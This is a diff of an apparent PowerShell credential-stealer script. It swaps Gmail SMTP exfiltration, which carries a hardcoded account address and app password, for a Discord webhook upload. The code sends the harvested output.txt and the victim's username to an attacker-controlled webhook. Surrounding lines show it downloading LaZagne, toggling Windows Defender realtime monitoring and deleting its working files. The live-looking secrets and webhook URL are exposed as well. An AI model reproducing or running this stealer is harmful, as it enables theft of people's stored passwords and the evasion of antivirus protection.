@@ -98,28 +98,30 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 # Mail Exfiltration
-$EmailFrom = "herbertswindel@gmail.com"
-$EmailTo = "herbertswindel@outlook.com"
-$Subject = "Hier zijn uw gegevens kameraad!"
-$Body = "Met vriendelijke groet, Herbert"
-$SMTPServer = "smtp.gmail.com"
+function Upload-Discord {
 
-$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
-$SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "isqn febe cwja vatn")
-
-# Send the email with attachment
-$Attachment = "$dir\output.txt"
-$Message = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
-$Message.Attachments.Add($Attachment)
-
-try {
-    $SMTPClient.Send($Message)
-    Write-Host "Email sent successfully."
-} catch {
-    Write-Host "Failed to send email. Error: $($_.Exception.Message)"
-}
-
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+    
+    $hookurl = 'https://discord.com/api/webhooks/1156610163462131783/0f1XmHXMhX3kZQcTK4iWg7eCo9SnBh3Vjj9ULk-Dn2iW9U7QKl7dRrc2YBYkpoKPzgTE'
+    
+    $Body = @{
+      'username' = "Dhr. Haak levert u de gegevens van " + $env:username 
+      'content' = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))){
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+    
+    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    }
+    
+    Upload-Discord -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
